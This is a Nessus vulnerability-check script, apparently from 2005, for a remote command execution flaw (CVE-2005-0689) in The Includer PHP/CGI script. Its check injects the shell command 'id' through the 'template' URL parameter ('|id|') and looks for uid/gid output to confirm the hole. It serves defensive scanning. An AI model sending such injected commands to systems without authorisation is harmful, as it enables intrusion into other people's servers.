#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#
# This script is released under the GNU GPLv2
#

desc = "
Synopsis :

The remote web server contains a PHP script that is affected by a
remote code execution vulnerability. 

Description:

The remote host is running The Includer, a PHP script for emulating
server-side includes. 

The version of The Includer installed on the remote host allows an
attacker to execute arbitrary shell commands by including shell
meta-characters as part of the URL. 
 
Solution : 

Unknown at this time.

See also : 

http://marc.theaimsgroup.com/?l=bugtraq&m=111021730710779&w=2

Risk factor :

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(20296);
  script_bugtraq_id(12738);
  script_cve_id("CVE-2005-0689");
  if ( defined_func("script_xref") ) script_xref(name:"OSVDB", value:"14624");
  script_version ("$Revision: 1.3 $");

  name["english"] = "The Includer remote command execution flaw";
  script_name(english:name["english"]);
 
  script_description(english:desc);
 
  summary["english"] = "The Includer remote command execution detection";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2005 David Maciejak");
  family["english"] = "CGI abuses";
  script_family(english:family["english"]);

  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_dependencies("http_version.nasl");

  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( ! port ) exit(0);

# Loop through directories.
if (thorough_tests) dirs = make_list("/includer", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  req = http_get(
    item:string(
      dir, "/includer.cgi?",
      "template=", SCRIPT_NAME
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  if (
    "document.write" >< res &&
    "uid=" >!< res
  ) {
    http_check_remote_code (
      unique_dir:dir,
      check_request:"/includer.cgi?template=|id|",
      check_result:"uid=[0-9]+.*gid=[0-9]+.*",
      command:"id",
      description:desc,
      port:port
    );
  }
}
